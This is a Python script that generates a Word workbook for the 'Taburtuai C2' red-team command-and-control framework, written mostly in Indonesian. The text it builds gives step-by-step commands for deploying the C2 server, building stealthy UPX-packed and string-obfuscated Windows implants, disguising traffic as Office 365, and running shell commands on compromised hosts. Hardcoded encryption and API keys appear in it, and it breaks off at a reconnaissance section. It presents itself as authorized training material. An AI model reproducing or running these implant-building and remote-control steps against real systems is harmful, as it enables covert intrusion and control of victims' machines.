"""
Taburtuai C2 — Operator Workbook Generator
Generates a professional .docx workbook for red team training.
"""

from docx import Document
from docx.shared import Pt, Inches, RGBColor, Cm
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.style import WD_STYLE_TYPE
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
import copy

doc = Document()

# ── Page margins (narrow) ──────────────────────────────────────────────────────
section = doc.sections[0]
section.page_width  = Inches(8.27)   # A4
section.page_height = Inches(11.69)
section.top_margin    = Cm(2.0)
section.bottom_margin = Cm(2.0)
section.left_margin   = Cm(2.5)
section.right_margin  = Cm(2.5)

# ── Palette ───────────────────────────────────────────────────────────────────
BLACK    = RGBColor(0x14, 0x14, 0x14)
DARK     = RGBColor(0x1F, 0x1F, 0x1F)
GRAY     = RGBColor(0x55, 0x55, 0x55)
LGRAY    = RGBColor(0xBB, 0xBB, 0xBB)
WHITE    = RGBColor(0xFF, 0xFF, 0xFF)
ACCENT   = RGBColor(0xC0, 0x39, 0x2B)   # dark red — minimal accent
MONO_BG  = RGBColor(0xF4, 0xF4, 0xF4)

FONT_BODY  = "Calibri"
FONT_MONO  = "Consolas"
FONT_HEAD  = "Calibri"

# ── Style helpers ─────────────────────────────────────────────────────────────

def set_cell_bg(cell, hex_color: str):
    tc   = cell._tc
    tcPr = tc.get_or_add_tcPr()
    shd  = OxmlElement("w:shd")
    shd.set(qn("w:val"),   "clear")
    shd.set(qn("w:color"), "auto")
    shd.set(qn("w:fill"),  hex_color)
    tcPr.append(shd)

def set_cell_border(cell, top=None, bottom=None, left=None, right=None):
    tc   = cell._tc
    tcPr = tc.get_or_add_tcPr()
    tcBorders = OxmlElement("w:tcBorders")
    for side, val in [("top",top),("bottom",bottom),("left",left),("right",right)]:
        if val:
            el = OxmlElement(f"w:{ side}")
            el.set(qn("w:val"),   val.get("val","single"))
            el.set(qn("w:sz"),    val.get("sz","4"))
            el.set(qn("w:space"), "0")
            el.set(qn("w:color"), val.get("color","141414"))
            tcBorders.append(el)
    tcPr.append(tcBorders)

def hr(doc, color="CCCCCC", thickness=6):
    p   = doc.add_paragraph()
    pPr = p._p.get_or_add_pPr()
    pb  = OxmlElement("w:pBdr")
    bot = OxmlElement("w:bottom")
    bot.set(qn("w:val"),   "single")
    bot.set(qn("w:sz"),    str(thickness))
    bot.set(qn("w:space"), "1")
    bot.set(qn("w:color"), color)
    pb.append(bot)
    pPr.append(pb)
    p.paragraph_format.space_before = Pt(0)
    p.paragraph_format.space_after  = Pt(4)
    return p

def add_page_break(doc):
    doc.add_page_break()

# ── Text helpers ──────────────────────────────────────────────────────────────

def h1(doc, text):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(18)
    p.paragraph_format.space_after  = Pt(4)
    r = p.add_run(text.upper())
    r.font.name      = FONT_HEAD
    r.font.size      = Pt(16)
    r.font.bold      = True
    r.font.color.rgb = ACCENT
    hr(doc, color="C0392B", thickness=8)
    return p

def h2(doc, text):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(14)
    p.paragraph_format.space_after  = Pt(2)
    r = p.add_run(text)
    r.font.name      = FONT_HEAD
    r.font.size      = Pt(13)
    r.font.bold      = True
    r.font.color.rgb = DARK
    return p

def h3(doc, text):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(10)
    p.paragraph_format.space_after  = Pt(2)
    r = p.add_run(text)
    r.font.name      = FONT_HEAD
    r.font.size      = Pt(11)
    r.font.bold      = True
    r.font.color.rgb = GRAY
    return p

def body(doc, text, italic=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(0)
    p.paragraph_format.space_after  = Pt(5)
    r = p.add_run(text)
    r.font.name      = FONT_BODY
    r.font.size      = Pt(10.5)
    r.font.italic    = italic
    r.font.color.rgb = BLACK
    return p

def note(doc, text):
    """Indented italic note / info box."""
    p = doc.add_paragraph()
    p.paragraph_format.left_indent  = Cm(0.5)
    p.paragraph_format.space_before = Pt(2)
    p.paragraph_format.space_after  = Pt(5)
    r = p.add_run("ℹ  " + text)
    r.font.name      = FONT_BODY
    r.font.size      = Pt(10)
    r.font.italic    = True
    r.font.color.rgb = GRAY
    return p

def warn(doc, text):
    p = doc.add_paragraph()
    p.paragraph_format.left_indent  = Cm(0.5)
    p.paragraph_format.space_before = Pt(2)
    p.paragraph_format.space_after  = Pt(5)
    r = p.add_run("⚠  " + text)
    r.font.name      = FONT_BODY
    r.font.size      = Pt(10)
    r.font.bold      = True
    r.font.color.rgb = ACCENT
    return p

def code(doc, text):
    """Monospaced code block with light gray background."""
    for line in text.strip().split("\n"):
        p = doc.add_paragraph()
        p.paragraph_format.space_before = Pt(0)
        p.paragraph_format.space_after  = Pt(0)
        p.paragraph_format.left_indent  = Cm(0.3)
        r = p.add_run(line if line else " ")
        r.font.name      = FONT_MONO
        r.font.size      = Pt(9)
        r.font.color.rgb = DARK
        # shading via paragraph border — simulated via run highlight
        pPr  = p._p.get_or_add_pPr()
        shd  = OxmlElement("w:shd")
        shd.set(qn("w:val"),   "clear")
        shd.set(qn("w:color"), "auto")
        shd.set(qn("w:fill"),  "F2F2F2")
        pPr.append(shd)
    # tiny spacer after block
    sp = doc.add_paragraph()
    sp.paragraph_format.space_before = Pt(0)
    sp.paragraph_format.space_after  = Pt(6)

def bullet(doc, text, level=0):
    p = doc.add_paragraph(style="List Bullet")
    p.paragraph_format.left_indent  = Cm(0.5 + level * 0.5)
    p.paragraph_format.space_before = Pt(1)
    p.paragraph_format.space_after  = Pt(1)
    r = p.add_run(text)
    r.font.name      = FONT_BODY
    r.font.size      = Pt(10.5)
    r.font.color.rgb = BLACK
    return p

def numbered(doc, text, level=0):
    p = doc.add_paragraph(style="List Number")
    p.paragraph_format.left_indent  = Cm(0.5 + level * 0.5)
    p.paragraph_format.space_before = Pt(1)
    p.paragraph_format.space_after  = Pt(1)
    r = p.add_run(text)
    r.font.name      = FONT_BODY
    r.font.size      = Pt(10.5)
    r.font.color.rgb = BLACK
    return p

def table(doc, headers, rows, col_widths=None):
    t = doc.add_table(rows=1+len(rows), cols=len(headers))
    t.style = "Table Grid"
    # Header row
    hdr_cells = t.rows[0].cells
    for i, h in enumerate(headers):
        set_cell_bg(hdr_cells[i], "1F1F1F")
        p = hdr_cells[i].paragraphs[0]
        p.clear()
        r = p.add_run(h)
        r.font.name      = FONT_BODY
        r.font.size      = Pt(9.5)
        r.font.bold      = True
        r.font.color.rgb = WHITE
    # Data rows
    for ri, row in enumerate(rows):
        cells = t.rows[ri+1].cells
        bg = "FFFFFF" if ri % 2 == 0 else "F8F8F8"
        for ci, val in enumerate(row):
            set_cell_bg(cells[ci], bg)
            p = cells[ci].paragraphs[0]
            p.clear()
            r = p.add_run(str(val))
            r.font.name      = FONT_MONO if ci > 0 and len(headers) > 2 else FONT_BODY
            r.font.size      = Pt(9)
            r.font.color.rgb = DARK
    # Column widths
    if col_widths:
        for i, w in enumerate(col_widths):
            for row in t.rows:
                row.cells[i].width = Cm(w)
    doc.add_paragraph().paragraph_format.space_after = Pt(6)
    return t

def lab_box(doc, number, title):
    """Styled lab exercise header."""
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(12)
    p.paragraph_format.space_after  = Pt(4)
    r1 = p.add_run(f"  LAB {number}  ")
    r1.font.name      = FONT_HEAD
    r1.font.size      = Pt(10)
    r1.font.bold      = True
    r1.font.color.rgb = WHITE
    r1.font.highlight_color = None
    # Background via run shading not natively supported on inline runs;
    # use paragraph border trick
    pPr = p._p.get_or_add_pPr()
    shd = OxmlElement("w:shd")
    shd.set(qn("w:val"),   "clear")
    shd.set(qn("w:color"), "auto")
    shd.set(qn("w:fill"),  "C0392B")
    pPr.append(shd)
    r2 = p.add_run(f"  {title}")
    r2.font.name      = FONT_HEAD
    r2.font.size      = Pt(10)
    r2.font.bold      = True
    r2.font.color.rgb = WHITE
    return p

def step(doc, n, text):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after  = Pt(2)
    r1 = p.add_run(f"Step {n}:  ")
    r1.font.name      = FONT_BODY
    r1.font.size      = Pt(10.5)
    r1.font.bold      = True
    r1.font.color.rgb = ACCENT
    r2 = p.add_run(text)
    r2.font.name      = FONT_BODY
    r2.font.size      = Pt(10.5)
    r2.font.color.rgb = BLACK
    return p

def spacer(doc, pts=6):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(0)
    p.paragraph_format.space_after  = Pt(pts)

# ═══════════════════════════════════════════════════════════════════════════════
#  COVER PAGE
# ═══════════════════════════════════════════════════════════════════════════════

# Title block
for _ in range(8):
    spacer(doc, 6)

p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("TABURTUAI C2")
r.font.name      = FONT_HEAD
r.font.size      = Pt(36)
r.font.bold      = True
r.font.color.rgb = DARK

p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("OPERATOR WORKBOOK")
r.font.name      = FONT_HEAD
r.font.size      = Pt(18)
r.font.bold      = False
r.font.color.rgb = ACCENT

spacer(doc, 8)
hr(doc, color="C0392B", thickness=12)
spacer(doc, 8)

p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("Red Team Operations & Adversary Simulation")
r.font.name      = FONT_HEAD
r.font.size      = Pt(13)
r.font.italic    = True
r.font.color.rgb = GRAY

spacer(doc, 6)

p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("Version 2.0  ·  For Authorized Use Only")
r.font.name      = FONT_BODY
r.font.size      = Pt(10)
r.font.color.rgb = LGRAY

for _ in range(10):
    spacer(doc, 6)

warn(doc, "PERINGATAN: Dokumen ini bersifat RAHASIA. Digunakan hanya untuk authorized security testing, red team engagement dengan izin tertulis, dan pelatihan keamanan internal. Penggunaan di luar konteks tersebut adalah tindakan ilegal.")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  TABLE OF CONTENTS (manual)
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Daftar Isi")

toc_items = [
    ("Bagian 1", "Pendahuluan & Arsitektur",                     "3"),
    ("Bagian 2", "Setup & Deployment Server",                     "5"),
    ("Bagian 3", "Generate Implant (Agent)",                      "8"),
    ("Bagian 4", "Agent Management & Checkin",                   "11"),
    ("Bagian 5", "Command Execution",                            "13"),
    ("Bagian 6", "File Operations (Upload / Download)",          "15"),
    ("Bagian 7", "Persistence",                                  "17"),
    ("Bagian 8", "Process Management & PPID Spoofing",           "19"),
    ("Bagian 9", "Evasion & Bypass (AMSI / ETW / Unhook)",       "21"),
    ("Bagian 10","Token Manipulation",                           "24"),
    ("Bagian 11","Process Injection",                            "27"),
    ("Bagian 12","Credential Access",                            "30"),
    ("Bagian 13","Reconnaissance (Screenshot & Keylogger)",      "33"),
    ("Bagian 14","Network & Pivoting",                           "35"),
    ("Bagian 15","Lateral Movement (WMI / WinRM / DCOM)",        "39"),
    ("Bagian 16","Advanced Transports (WS / DNS / DoH / ICMP)",  "44"),
    ("Bagian 17","Multi-Operator Team Server (RBAC)",            "47"),
    ("Bagian 18","Advanced Techniques (BOF / Registry / Stager)","49"),
    ("Bagian 19","Skenario Red Team End-to-End",                 "52"),
    ("Bagian 20","OPSEC Checklist & Best Practices",             "57"),
]

tbl = table(doc,
    ["Bagian", "Topik", "Hal."],
    toc_items,
    col_widths=[2.5, 11.0, 1.5]
)

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 1 — PENDAHULUAN
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 1 — Pendahuluan & Arsitektur")

body(doc, "Taburtuai C2 adalah Command & Control framework yang dirancang untuk mendukung operasi red team dan adversary simulation. Framework ini mengimplementasikan teknik-teknik yang digunakan oleh threat actor nyata, sehingga memungkinkan tim keamanan untuk menguji ketahanan pertahanan mereka secara realistis.")

h2(doc, "Komponen Utama")

table(doc,
    ["Komponen", "Peran", "Lokasi"],
    [
        ("C2 Server",    "Menerima check-in agent, menyimpan perintah, mengelola operator",  "bin/server"),
        ("Agent (Implant)", "Berjalan di target, eksekusi perintah, kirim hasil ke server",  "bin/agent_*.exe"),
        ("Operator CLI", "Interface untuk operator mengirim perintah dan membaca output",    "bin/operator"),
        ("Stager",       "Payload kecil yang men-download dan menjalankan agent penuh",      "bin/stager_*.exe"),
        ("Payload Generator", "Generate agent dengan konfigurasi build-time custom",        "bin/generate"),
    ],
    col_widths=[3.5, 9.0, 3.5]
)

h2(doc, "Arsitektur Komunikasi")

body(doc, "Komunikasi antara agent dan server bersifat asimetris: agent melakukan polling (HTTP GET) ke server secara berkala untuk mengambil perintah, lalu mengirimkan hasilnya via HTTP POST. Semua payload dienkripsi dengan AES-256-GCM menggunakan kunci yang baked-in saat build.")

code(doc, """
[Operator CLI]  ──POST──►  [C2 Server :8080]  ◄──GET (beacon)──  [Agent]
                                    │                                   │
                             [SQLite Store]               [Target Network]
                             [CommandQueue]          (eksekusi perintah lokal)
""")

h2(doc, "Transport yang Didukung")

table(doc,
    ["Transport", "Port", "Kapan Digunakan", "Build Target"],
    [
        ("HTTP (default)",      "8080",      "Jaringan terbuka, testing",            "agent-win-stealth"),
        ("HTTPS / TLS",         "8443",      "Production, enkripsi in-transit",       "agent-win-stealth --tls"),
        ("WebSocket",           "8081",      "Butuh latensi rendah (<1 detik)",       "agent-win-ws"),
        ("DNS Authoritative",   "5353/53",   "Hanya DNS outbound yang diizinkan",    "agent-win-dns"),
        ("DNS-over-HTTPS (DoH)","443",       "Filter ketat, via resolver publik",     "agent-win-doh"),
        ("ICMP",                "—",         "TCP diblokir total (Windows only)",     "agent-win-icmp"),
        ("SMB Named Pipe",      "445",       "Internal pivot, tanpa internet",        "agent-win-smb"),
    ],
    col_widths=[3.5, 2.0, 6.0, 4.0]
)

h2(doc, "Prasyarat Lab")

table(doc,
    ["Komponen", "Spesifikasi", "Keterangan"],
    [
        ("C2 Server OS",   "Linux / Windows / macOS",  "Go 1.21+ terinstall"),
        ("Target VM",      "Windows 10/11 / Server",   "Mesin yang akan di-compromise"),
        ("Go Toolchain",   "≥ 1.21",                   "Untuk build server & agent"),
        ("MinGW (opsional)","gcc untuk CGO",            "Diperlukan beberapa build target"),
        ("Network",        "Target bisa reach C2 IP",  "Firewall rules disesuaikan"),
    ],
    col_widths=[3.5, 4.0, 7.5]
)

note(doc, "Untuk keperluan lab, C2 server dan target bisa berjalan di host yang sama atau VM yang se-network. Di lapangan, C2 server berada di VPS internet dengan domain dan TLS.")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 2 — SERVER SETUP
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 2 — Setup & Deployment Server")

body(doc, "C2 server menerima koneksi dari agent dan menyediakan API untuk operator. Server dapat dijalankan dalam berbagai mode: plain HTTP untuk testing, HTTPS untuk produksi, dengan atau tanpa listener tambahan (WebSocket, DNS).")

h2(doc, "Build Server")

step(doc, 1, "Clone repository dan masuk ke direktori proyek.")
code(doc, """git clone https://github.com/mjopsec/taburtuaiC2.git
cd taburtuaiC2""")

step(doc, 2, "Build semua binary sekaligus.")
code(doc, """make all
# Atau build server saja:
make server
# Output: bin/server (Linux/Mac) atau bin/server.exe (Windows)""")

step(doc, 3, "Verifikasi binary berhasil di-build.")
code(doc, """./bin/server --help""")

h2(doc, "Menjalankan Server — Mode Dasar")

body(doc, "Untuk lab dan testing, server dapat dijalankan tanpa konfigurasi tambahan. Kunci enkripsi (ENCRYPTION_KEY) harus sama dengan yang di-bake ke dalam agent.")

code(doc, """# Minimal — HTTP, port 8080, tidak ada autentikasi
ENCRYPTION_KEY=K3yRah4sia ./bin/server

# Dengan log level debug untuk troubleshooting
ENCRYPTION_KEY=K3yRah4sia ./bin/server --log-level DEBUG

# Port custom
ENCRYPTION_KEY=K3yRah4sia ./bin/server --port 8443""")

h2(doc, "Menjalankan Server — Mode Produksi (HTTPS)")

body(doc, "Untuk deployment nyata, selalu gunakan TLS. Server dapat generate sertifikat self-signed secara otomatis, atau menggunakan sertifikat dari Let's Encrypt / CA lain.")

code(doc, """# HTTPS dengan sertifikat otomatis (self-signed)
ENCRYPTION_KEY=K3yRah4sia ./bin/server \\
  --tls \\
  --tls-port 8443 \\
  --port 8080

# HTTPS dengan sertifikat kustom
ENCRYPTION_KEY=K3yRah4sia ./bin/server \\
  --tls \\
  --tls-cert /etc/ssl/c2.crt \\
  --tls-key  /etc/ssl/c2.key \\
  --tls-port 443

# API key authentication (wajib di produksi)
ENCRYPTION_KEY=K3yRah4sia ./bin/server \\
  --auth \\
  --api-key "s3cr3t-operator-key-2026" \\
  --tls --tls-port 8443""")

h2(doc, "Listener Tambahan")

code(doc, """# WebSocket listener (latensi command <1 detik)
ENCRYPTION_KEY=K3yRah4sia ./bin/server --ws --ws-port 8081

# DNS authoritative listener (butuh domain)
ENCRYPTION_KEY=K3yRah4sia ./bin/server \\
  --dns \\
  --dns-domain c2.yourdomain.com \\
  --dns-port 5353

# Semua sekaligus
ENCRYPTION_KEY=K3yRah4sia ./bin/server \\
  --tls --tls-port 8443 \\
  --ws  --ws-port 8081  \\
  --dns --dns-domain c2.yourdomain.com \\
  --auth --api-key "s3cr3t-key"       \\
  --profile office365""")

h2(doc, "Variabel Lingkungan (Environment Variables)")

table(doc,
    ["Variabel", "Default", "Keterangan"],
    [
        ("ENCRYPTION_KEY",  "SpookyOrcaC2AES1", "Kunci AES-256 — harus sama dengan agent"),
        ("PORT",            "8080",             "Port HTTP utama"),
        ("HOST",            "0.0.0.0",          "Bind address"),
        ("AUTH_ENABLED",    "false",            "Aktifkan API key auth"),
        ("API_KEY",         "your-api-key-here","Kunci untuk operator"),
        ("TLS_ENABLED",     "false",            "Aktifkan HTTPS"),
        ("TLS_PORT",        "8443",             "Port HTTPS"),
        ("WS_ENABLED",      "false",            "Aktifkan WebSocket listener"),
        ("WS_PORT",         "8081",             "Port WebSocket"),
        ("DNS_ENABLED",     "false",            "Aktifkan DNS listener"),
        ("DNS_PORT",        "5353",             "Port UDP DNS"),
        ("DNS_DOMAIN",      "",                 "Zone DNS authoritative"),
        ("ADMIN_KEY",       "",                 "Secret untuk promote ke role admin"),
        ("LOG_DIR",         "./logs",           "Direktori log output"),
        ("DB_PATH",         "./data/taburtuai.db","Path database SQLite"),
    ],
    col_widths=[3.5, 3.5, 8.0]
)

lab_box(doc, "2.1", "Deploy C2 Server untuk Lab")
step(doc, 1, "Buka terminal di mesin C2 server.")
step(doc, 2, "Set environment variable kunci enkripsi.")
code(doc, "export ENCRYPTION_KEY=LabTrainingKey2026")
step(doc, 3, "Jalankan server dengan log debug.")
code(doc, "./bin/server --log-level DEBUG --port 8080")
step(doc, 4, "Verifikasi server berjalan dengan mengakses health endpoint.")
code(doc, 'curl http://localhost:8080/api/v1/health\n# Expected: {"success":true,"data":{"status":"healthy",...}}')
step(doc, 5, "Catat IP server — akan digunakan saat build agent.")
note(doc, "Dalam lab, ganti localhost dengan IP mesin server yang dapat diakses dari target VM.")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 3 — GENERATE IMPLANT
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 3 — Generate Implant (Agent)")

body(doc, "Agent adalah binary yang berjalan di mesin target. Build-time variables di-inject melalui Go linker flags (-ldflags), sehingga setiap agent dapat dikonfigurasi dengan server URL, kunci enkripsi, interval beacon, dan berbagai opsi OPSEC yang berbeda tanpa mengubah source code.")

h2(doc, "Makefile Build Targets")

table(doc,
    ["Target", "Deskripsi", "Platform"],
    [
        ("agent-win-stealth",   "Windows agent, UPX packed, no console window",     "Windows x64"),
        ("agent-win-ws",        "Agent dengan WebSocket transport (latensi rendah)", "Windows x64"),
        ("agent-win-dns",       "Agent dengan DNS authoritative transport",          "Windows x64"),
        ("agent-win-doh",       "Agent dengan DNS-over-HTTPS transport",             "Windows x64"),
        ("agent-win-icmp",      "Agent dengan ICMP echo transport",                  "Windows x64"),
        ("agent-win-smb",       "Agent dengan SMB named pipe transport",             "Windows x64"),
        ("agent-win-encrypted", "Agent dengan XOR-encrypted strings (anti-strings)", "Windows x64"),
        ("agent-linux",         "Agent untuk target Linux",                          "Linux x64"),
    ],
    col_widths=[4.0, 9.0, 3.0]
)

h2(doc, "Variabel Build Utama")

table(doc,
    ["Variabel", "Default", "Keterangan"],
    [
        ("C2_SERVER",    "http://192.168.10.102:8080", "URL server C2 (wajib diubah)"),
        ("ENC_KEY",      "SpookyOrcaC2AES1",           "Kunci enkripsi (harus sama dengan server)"),
        ("INTERVAL",     "30",                          "Beacon interval dalam detik"),
        ("JITTER",       "30",                          "Jitter persen (0-100) untuk variasi timing"),
        ("PROFILE",      "default",                     "Malleable HTTP profile"),
        ("TRANSPORT",    "http",                        "Transport: http|ws|dns|doh|icmp|smb"),
        ("CERT_PIN",     "",                            "SHA-256 fingerprint TLS cert server"),
        ("FRONT_DOMAIN", "",                            "Domain fronting host header"),
        ("KILL_DATE",    "",                            "Tanggal agent mati (YYYY-MM-DD)"),
        ("EXEC_METHOD",  "cmd",                         "Metode eksekusi shell: cmd|powershell|wmi"),
        ("ENABLE_EVASION","false",                      "Aktifkan evasion features"),
        ("SLEEP_MASKING","false",                       "Obfuskasi sleep call (anti-sandbox)"),
        ("DEBUG",        "false",                       "Tampilkan console window saat exit"),
    ],
    col_widths=[3.5, 4.5, 7.0]
)

h2(doc, "Build Agent Standard")

body(doc, "Ini adalah build paling umum untuk engagement awal. Agent menggunakan HTTP transport, interval 30 detik, dengan jitter 30%.")

code(doc, """make agent-win-stealth \\
  C2_SERVER=http://192.168.10.5:8080 \\
  ENC_KEY=LabTrainingKey2026 \\
  INTERVAL=30 \\
  JITTER=30

# Output: bin/agent_windows_stealth.exe""")

h2(doc, "Build Agent untuk Produksi (HTTPS + Cert Pin)")

body(doc, "Untuk engagement nyata, selalu gunakan HTTPS dan cert pinning untuk mencegah MITM/proxy inspection.")

code(doc, """# Dapatkan fingerprint sertifikat server dulu
openssl s_client -connect c2.yourdomain.com:8443 </dev/null 2>/dev/null \\
  | openssl x509 -fingerprint -sha256 -noout
# SHA256 Fingerprint=AA:BB:CC:...

# Build dengan cert pin
make agent-win-stealth \\
  C2_SERVER=https://c2.yourdomain.com:8443 \\
  ENC_KEY=ProdSecret2026! \\
  CERT_PIN=aabbcc...64hexchars \\
  INTERVAL=60 \\
  JITTER=40 \\
  KILL_DATE=2026-12-31 \\
  PROFILE=office365""")

h2(doc, "Build Agent dengan Malleable Profile")

body(doc, "Malleable profiles mengubah tampilan HTTP traffic agar menyerupai layanan legitimate. Ini membuat traffic C2 sulit dibedakan dari traffic normal saat di-inspect oleh proxy atau IDS.")

table(doc,
    ["Profile", "Menyerupai", "User-Agent"],
    [
        ("default",    "Generic HTTP",           "Taburtuai/2.0"),
        ("office365",  "Microsoft Office 365",   "Microsoft Office/16.0..."),
        ("cdn",        "CDN asset request",       "Mozilla/5.0 (CDN...)"),
        ("jquery",     "jQuery CDN fetch",        "Mozilla/5.0 (jQuery...)"),
        ("slack",      "Slack API call",          "Slackbot-LinkExpanding..."),
        ("ocsp",       "OCSP certificate check",  "Mozilla/5.0 (OCSP...)"),
    ],
    col_widths=[2.5, 4.5, 8.5]
)

code(doc, """# Agent dengan profile office365 (menyerupai Microsoft traffic)
make agent-win-stealth \\
  C2_SERVER=https://c2.corp.local:8443 \\
  ENC_KEY=LabTrainingKey2026 \\
  PROFILE=office365

# Server harus dijalankan dengan profile yang sama
./bin/server --profile office365 --tls --tls-port 8443""")

h2(doc, "Build Agent WebSocket (Latensi Rendah)")

body(doc, "WebSocket transport mempertahankan satu koneksi persistent ke server. Server dapat push command langsung tanpa menunggu beacon interval, sehingga latensi eksekusi <1 detik.")

code(doc, """make agent-win-ws \\
  C2_SERVER=http://192.168.10.5:8080 \\
  ENC_KEY=LabTrainingKey2026 \\
  TRANSPORT=ws

# Server wajib dijalankan dengan --ws
./bin/server --ws --ws-port 8081""")

h2(doc, "Build Agent dengan String Enkripsi (Anti-Strings)")

body(doc, "Target agent-win-encrypted meng-obfuskasi semua build-time strings (server URL, kunci) menggunakan XOR sederhana sehingga tidak terlihat dalam output strings.exe atau BinText.")

code(doc, """make agent-win-encrypted \\
  C2_SERVER=http://192.168.10.5:8080 \\
  ENC_KEY=LabTrainingKey2026 \\
  XOR_KEY=0x4f""")

lab_box(doc, "3.1", "Build Agent untuk Lab Environment")
step(doc, 1, "Ganti IP di command berikut dengan IP mesin C2 server Anda.")
step(doc, 2, "Jalankan make build.")
code(doc, """make agent-win-stealth \\
  C2_SERVER=http://<IP_SERVER>:8080 \\
  ENC_KEY=LabTrainingKey2026 \\
  INTERVAL=15 \\
  JITTER=20""")
step(doc, 3, "Verifikasi binary terbuat.")
code(doc, "ls -lh bin/agent_windows_stealth.exe")
step(doc, 4, "Transfer binary ke target VM (via shared folder, HTTP server, atau metode lain).")
step(doc, 5, "Jalankan binary di target VM dan perhatikan output di console server.")
note(doc, "Di lab, jalankan agent langsung dari command prompt. Di lapangan, delivery menggunakan stager, phishing, atau exploit.")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 4 — AGENT MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 4 — Agent Management & Check-in")

body(doc, "Setelah agent berjalan di target, ia akan melakukan check-in ke server C2 dengan mengirimkan informasi sistem (hostname, username, OS, PID, privileges). Server mencatat agent dan membuatnya tersedia untuk operator.")

h2(doc, "Operator Console")

body(doc, "Operator berinteraksi dengan C2 melalui binary 'operator'. Console menyediakan prompt interaktif atau perintah satu-baris.")

code(doc, """# Jalankan console interaktif
./bin/operator console --server http://192.168.10.5:8080

# Jika autentikasi aktif
./bin/operator console --server http://192.168.10.5:8080 --api-key s3cr3t-key

# Prompt akan muncul:
# taburtuai(192.168.10.5:8080) ›""")

h2(doc, "Daftar Agent (List Agents)")

code(doc, """# Semua agent
agents list

# Filter hanya yang online
agents list --status online

# Output contoh:
# ID         HOSTNAME          USER        OS       STATUS   LAST SEEN
# 7d019eb7   DESKTOP-VICTIM    john.doe    Windows  online   5s ago
# 4f1b8e23   DC01              SYSTEM      Windows  online   12s ago""")

h2(doc, "Detail Agent")

code(doc, """# Info lengkap satu agent
agents info 7d019eb7

# Output contoh:
# Agent: 7d019eb7-...
# Hostname   : DESKTOP-VICTIM
# Username   : CORP\\john.doe
# OS         : Windows 11 Home (amd64)
# PID        : 4821
# Privileges : Medium
# Working Dir: C:\\Users\\john.doe
# Last Seen  : 3s ago""")

table(doc,
    ["Command", "Fungsi"],
    [
        ("agents list",               "List semua agent terdaftar"),
        ("agents list --status online","List agent yang aktif saja"),
        ("agents info <id>",          "Detail lengkap satu agent"),
        ("agents delete <id>",        "Hapus agent dari database"),
        ("queue clear <id>",          "Hapus semua perintah pending di antrian"),
        ("queue stats",               "Statistik antrian (pending/running/done)"),
    ],
    col_widths=[5.5, 9.5]
)

note(doc, "Agent ID bisa disingkat menjadi 8 karakter pertama. Misalnya '7d019eb7' untuk agent '7d019eb7-b1ae-4c90-9b8e-e860ba07f889'.")

lab_box(doc, "4.1", "Verifikasi Agent Check-in")
step(doc, 1, "Pastikan server berjalan dan agent sudah dieksekusi di target.")
step(doc, 2, "Buka console operator.")
code(doc, "./bin/operator console --server http://<IP_SERVER>:8080")
step(doc, 3, "List agents dan verifikasi agent muncul.")
code(doc, "agents list")
step(doc, 4, "Lihat detail agent.")
code(doc, "agents info <agent-id>")
step(doc, 5, "Catat Agent ID untuk digunakan pada lab-lab berikutnya.")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 5 — COMMAND EXECUTION
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 5 — Command Execution")

body(doc, "Command execution adalah fungsi paling dasar C2. Operator mengirim perintah shell yang dieksekusi oleh agent di target, dan hasilnya dikembalikan ke server.")

h2(doc, "Shell Command Dasar")

code(doc, """# Eksekusi perintah (via cmd.exe secara default)
cmd <agent-id> "whoami /priv"
cmd <agent-id> "ipconfig /all"
cmd <agent-id> "net user"
cmd <agent-id> "net localgroup administrators"

# Via PowerShell
cmd <agent-id> "Get-Process" --method powershell

# Dengan working directory berbeda
cmd <agent-id> "dir" --dir "C:\\Users\\john.doe\\Documents"

# Dengan timeout (detik)
cmd <agent-id> "ping -n 100 8.8.8.8" --timeout 120

# Tunggu hasil sebelum lanjut (blocking)
cmd <agent-id> "whoami" --wait""")

h2(doc, "Metode Eksekusi")

table(doc,
    ["Method", "Deskripsi", "Kapan Digunakan"],
    [
        ("cmd (default)", "cmd.exe /c <command>",                   "Perintah umum, batch"),
        ("powershell",    "powershell.exe -Command <command>",      "PS cmdlets, .NET access"),
        ("wmi",           "WMI process create via wmic.exe",        "Bypass shell restrictions"),
        ("mshta",         "mshta.exe vbscript:...",                  "LOLBin evasion"),
        ("direct",        "Exec langsung tanpa shell wrapper",      "Binary execution"),
    ],
    col_widths=[3.0, 5.5, 6.5]
)

h2(doc, "Interactive Shell")

body(doc, "Shell interaktif memungkinkan operator berinteraksi real-time dengan target layaknya remote shell, dengan support untuk perintah yang membutuhkan input atau multiple command berurutan.")

code(doc, """# Buka interactive shell
shell <agent-id>

# Di dalam shell:
# taburtuai-shell(DESKTOP-VICTIM) > whoami
# CORP\\john.doe
# taburtuai-shell(DESKTOP-VICTIM) > cd C:\\Users
# taburtuai-shell(DESKTOP-VICTIM) > dir
# ...
# taburtuai-shell(DESKTOP-VICTIM) > exit""")

h2(doc, "Perintah Recon Dasar via Shell")

